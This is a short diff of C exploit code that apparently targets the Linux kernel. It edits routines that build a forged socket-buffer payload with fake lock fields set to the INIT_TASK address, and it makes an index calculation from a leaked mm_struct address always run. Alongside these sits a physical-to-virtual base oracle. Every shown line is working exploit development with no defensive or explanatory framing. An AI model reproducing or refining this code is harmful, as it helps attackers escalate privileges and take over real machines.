@@ -916,7 +916,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
+      put64(p, LOCK_OFF + 0x18, INIT_TASK);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -1141,8 +1141,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
+size_t object_index = (leaked - base) / MM_STRUCT_SZ;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, object_index);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -1204,10 +1203,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     cleanup_page_prepare_state();
     return 0;
   }
-#endif
-#else
-  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
 #endif
   if (!prepare_skb_payload(base, payload_mode)) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
